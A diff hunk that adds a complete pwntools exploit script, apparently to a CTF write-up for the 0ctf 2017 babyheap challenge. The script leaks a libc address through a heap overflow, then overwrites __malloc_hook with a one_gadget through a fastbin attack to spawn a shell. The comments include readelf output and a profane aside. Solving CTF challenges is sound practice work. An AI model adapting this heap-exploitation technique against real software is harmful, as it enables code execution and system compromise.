@@ -341,6 +341,118 @@ Command: $
 
 ![4aab05c577ec3139f277fd3ca68c6d95](/images/post/4aab05c577ec3139f277fd3ca68c6d95.png)
 
+```python
+from pwn import *
+context(arch='amd64', os='linux', log_level='debug')
+context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe', 'bash', '-c']
+
+exe = ELF("./pwn_patched")
+context.binary = exe
+# p =  remote("ae6d248377460ac0bfff31f1.tcp-ctf2.dasctf.com", 9999, ssl=True, sni="ae6d248377460ac0bfff31f1.tcp-ctf2.dasctf.com")
+p =  process("./pwn_patched")
+libc = ELF("./libc.so.6")
+
+def add_chunk(size):
+    p.recvuntil(b'Command: ')
+    p.sendline(b'1')
+    p.recvuntil(b'Size: ')
+    p.sendline(str(size).encode())
+    
+def edit_chunk(idx, size, content):
+    p.recvuntil(b'Command: ')
+    p.sendline(b'2')
+    p.recvuntil(b'Index: ')
+    p.sendline(str(idx).encode())
+    p.recvuntil(b'Size: ')
+    p.sendline(str(size).encode())
+    p.recvuntil(b'Content: ')
+    p.send(content)
+    
+def free_chunk(idx):
+    p.recvuntil(b'Command: ')
+    p.sendline(b'3')
+    p.recvuntil(b'Index: ')
+    p.sendline(str(idx).encode())
+    
+def show_content(idx):
+    p.recvuntil(b'Command: ')
+    p.sendline(b'4')
+    p.recvuntil(b'Index: ')
+    p.sendline(str(idx).encode())
+    
+
+
+fake_chunk = flat({
+            0x100: 0x110,
+            0x108: 0x221,}, filler = '\x00')
+            
+            
+add_chunk(256)
+add_chunk(256)
+add_chunk(256)
+add_chunk(256)
+edit_chunk(0, len(fake_chunk), fake_chunk)
+# gdb.attach(p)
+free_chunk(1)
+add_chunk(256)
+show_content(2)
+gdb.attach(p)
+# (base) dxfaker@LAPTOP-US9FCLPD:/mnt/d/ctf/flag/pwn/ctf^2/0ctf_2017_babyheap$ readelf -sW ./libc.so.6 | grep -E ' __free_hook$| __malloc_hook$| __realloc_hook$| system$'
+# 5654: 00000000000453a0    45 FUNC    WEAK   DEFAULT   13 system
+# 6241: 00000000003c4b10     8 OBJECT  WEAK   DEFAULT   33 __malloc_hook
+# 6248: 00000000003c67a8     8 OBJECT  WEAK   DEFAULT   34 __free_hook
+# 7294: 00000000003c4b08     8 OBJECT  WEAK   DEFAULT   33 __realloc_hook
+# (base) dxfaker@LAPTOP-US9FCLPD:/mnt/d/ctf/flag/pwn/ctf^2/0ctf_2017_babyheap$ readelf -sW ./libc.so.6 | grep -E 'main_arena'
+   # 915: 00000000003c4b20  2192 OBJECT  LOCAL  DEFAULT   33 main_arena
+   # (base) dxfaker@LAPTOP-US9FCLPD:/mnt/d/ctf/flag/pwn/ctf^2/0ctf_2017_babyheap$ one_gadget ./libc.so.6
+# 0x4527a execve("/bin/sh", rsp+0x30, environ)
+p.recvuntil(b'Content: ')   # 吃掉 "Content: "
+p.recv(1)                   # 吃掉那个 '\n'
+leak = u64(p.recv(8).ljust(8, b'\x00'))
+libc.address = leak - 88 - 0x3c4b20
+system_add = libc.address + 0x453a0
+free_hook  = libc.address + 0x3c67a8 
+malloc_hook = 0x3c4b10 + libc.address
+fake_chunk_addr = malloc_hook - 0x23 
+fb_freehook = free_hook - 0x18
+bk_freehook = free_hook - 0x10
+# one_gadget = libc.address + 0x4527a  我草死你的吗
+one_gadget = libc.address + 0x4526a   # 原版 libc-2.23.so，不是 11.3 的 0x4527a
+
+# 如果还不行，再换：
+# 
+log.info(f"leak         = {hex(leak)}")
+log.info(f"libc.address = {hex(libc.address)}")
+log.info(f"one_gadget   = {hex(one_gadget)}   off={hex(one_gadget - libc.address)}")
+log.info(f"fake_chunk   = {hex(fake_chunk_addr)}   off={hex(fake_chunk_addr - libc.address)}")
+log.info(f"malloc_hook  = {hex(malloc_hook)}   off={hex(malloc_hook - libc.address)}")
+add_chunk(96)#4
+add_chunk(96)#5
+add_chunk(96)#6
+add_chunk(96)#7
+free_chunk(5)
+
+fakechunk = flat({
+    0x60: 0x60,
+    0x68: 0x71,
+    0x70: fake_chunk_addr
+},filler = b'\x00')
+
+edit_chunk(4, len(fakechunk), fakechunk)
+
+add_chunk(96)#7
+add_chunk(96)#8
+# payload = p64(0) + p64(system_add)
+# edit_chunk(8, len(payload), payload)
+# add_chunk(0x10)
+# edit_chunk(9, 8, b'/bin/sh\x00')
+# free_chunk(9)
+payload = b'\x00' * 0x13 + p64(one_gadget)
+edit_chunk(8, len(payload), payload)
+add_chunk(0x10) 
+p.interactive()
+```
+
 
 
 
